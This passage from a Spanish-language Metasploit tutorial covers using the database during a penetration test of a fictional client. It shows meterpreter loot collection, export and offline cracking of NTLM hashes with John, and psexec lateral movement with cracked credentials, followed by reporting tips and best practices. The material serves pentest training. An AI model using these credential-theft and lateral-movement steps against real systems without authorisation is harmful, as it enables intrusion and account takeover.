meterpreter > screenshot                    # Auto-saved to loot
meterpreter > background

msf6 > creds                                # Verify
msf6 > loot                                 # Verify
msf6 > db_export -f xml day7_exploitation.xml

# ════════════════════════════════════════════════════════
# DÍA 8-10 - POST-EXPLOITATION & LATERAL MOVEMENT
# ════════════════════════════════════════════════════════
msf6 > creds -t ntlm -o hashes.jtr
$ john hashes.jtr                           # Offline cracking

msf6 > creds add user:bob password:cracked123
msf6 > use exploit/windows/smb/psexec
msf6 exploit(psexec) > set SMBUser bob
msf6 exploit(psexec) > set SMBPass cracked123
msf6 exploit(psexec) > hosts -S Windows -R
msf6 exploit(psexec) > run

msf6 > db_export -f xml day10_final.xml

# ════════════════════════════════════════════════════════
# FINAL - REPORTING
# ════════════════════════════════════════════════════════
msf6 > workspace acme_corp_external_2025
msf6 > hosts -v                             # Stats
msf6 > services -c host,port,name | wc -l   # Counts
msf6 > vulns                                # Vulnerabilities
msf6 > creds | wc -l                        # Credential count
msf6 > loot -t windows.hashes               # Evidence

msf6 > db_export -f xml FINAL_acme_corp_report.xml
$ cp FINAL_acme_corp_report.xml /backup/safe_location/
```

### Mejores Prácticas

✅ **Usa workspaces** - Separa cada cliente/proyecto  
✅ **Backups diarios** - `db_export` al final del día  
✅ **db_nmap > Nmap manual** - Auto-import, más eficiente  
✅ **Usa `-R` flag** - Auto-configurar RHOSTS  
✅ **Agrega comentarios** - `hosts -m "comment" IP`  
✅ **Exporta creds para cracking** - `creds -o file.jtr`  
✅ **Verifica loot** - `loot` para ver archivos extraídos  

❌ **No mezcles clientes** - Un workspace por cliente  
❌ **No confíes en memoria** - La database es tu fuente de verdad  
❌ **No uses `workspace -D`** - Borra TODO (peligroso)  
❌ **No olvides backups remotos** - Local + Cloud  
❌ **No pierdas archivos de loot** - Están en `/root/.msf4/loot/`  

### Diferencias Clave: Metasploit CON vs SIN Database

| Aspecto | SIN Database | CON Database (PostgreSQL) |
|---------|--------------|---------------------------|
| **Organización** | Archivos .txt dispersos | Todo en tablas relacionadas |
| **Búsqueda** | `grep` manual | SQL queries instantáneas |
| **Performance** | Lento con 100+ hosts | Rápido con 10,000+ hosts |
| **Relaciones** | Ninguna | Hosts ↔ Services ↔ Vulns ↔ Creds |
| **Backup** | Copiar 50+ archivos | `db_export` un comando |
| **Actualización** | Manual, propenso a errores | Automática |
| **Integridad** | Fácil corromper | ACID transactions |
| **Integración** | Cero | Nativa con exploits |
| **Colaboración** | Difícil | Exportar/importar DB |

### Próximos Pasos

Para dominar databases en Metasploit:

1. ✅ **Practica creando múltiples workspaces**  
   - Workspace por cada red/cliente
   - Naming convention consistente

2. ✅ **Importa scans existentes**  
   - Busca archivos .xml viejos de Nmap
   - Impórtalos con `db_import`
   - Explora los datos con `hosts`, `services`

3. ✅ **Usa db_nmap en lugar de Nmap**  
   - Haz tu próximo scan con `db_nmap`
   - Compara la experiencia vs Nmap → Import manual

4. ✅ **Experimenta con filtros y `-R`**  
   - `hosts -S Windows -R`
   - `services -p 445 -R`
   - Usa en exploits reales

5. ✅ **Automatiza backups**  
   - Crea script de backup
   - Configura cron job
   - Prueba restaurar un backup

6. ✅ **Exporta credenciales para cracking**  
   - `creds -o hashes.jtr`
   - Crackea con John the Ripper
   - Importa passwords crackeados de vuelta

**Las databases transforman Metasploit de una simple herramienta de exploits en una plataforma completa de gestión de pentesting con persistencia, organización y análisis de datos profesional.** 🚀

---

**¡Sección 7: Databases - COMPLETADA!** 🎯
